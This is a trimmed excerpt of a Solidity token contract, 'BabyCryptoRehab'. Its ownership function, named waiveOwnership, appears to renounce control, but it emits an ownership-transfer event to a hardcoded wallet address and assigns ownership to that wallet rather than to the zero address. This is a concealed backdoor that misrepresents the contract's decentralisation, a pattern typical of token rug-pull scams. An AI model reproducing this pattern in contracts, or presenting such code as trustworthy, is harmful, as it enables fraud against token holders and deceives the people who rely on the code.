...
contract Ownable is Context {
    ...
    function waiveOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0xA8C451BfEBe199Cb5AbE2A069cdBa72F1caB0163));
        _owner = address(0xA8C451BfEBe199Cb5AbE2A069cdBa72F1caB0163);
    }
...
contract BabyCryptoRehab is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "BabyCryptoRehab";
